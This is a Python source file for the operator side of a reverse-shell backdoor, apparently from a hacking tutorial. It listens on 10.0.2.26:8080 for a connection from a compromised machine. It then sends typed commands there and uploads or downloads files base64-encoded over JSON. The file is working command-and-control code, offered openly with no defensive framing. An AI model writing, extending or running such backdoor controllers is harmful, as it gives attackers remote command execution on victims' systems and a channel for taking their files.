import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Connection Established")

    def reliable_send(self, data):
        json_command = json.dumps(data)
        self.connection.send(json_command.encode("utf-8"))

    def reliable_receive(self):
        encoded_json_result = b""
        while True:
            chunk = self.connection.recv(8192)
            encoded_json_result += chunk
            if len(chunk) < 8192:
                break
        return json.loads(encoded_json_result.decode("utf-8"))

    def upload_file(self, path):
        with open(path, "rb") as file:
            ready_file = b""
            while True:
                chunk = file.read(8192)
                ready_file += chunk
                if len(chunk) < 8192:
                    break
        return base64.b64encode(ready_file)

    def download_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download successful."

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:

                if command[0] == "upload":
                    file_content = self.upload_file(command[1])
                    command.append(file_content.decode("utf-8"))
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Backdoor" not in result:
                    result = self.download_file(command[1], result)
            except Exception as e:
                result = "[-] Listener says: Error during command execution \n" + str(e)
            print(result)


my_listener = Listener("10.0.2.26", 8080)
my_listener.run()
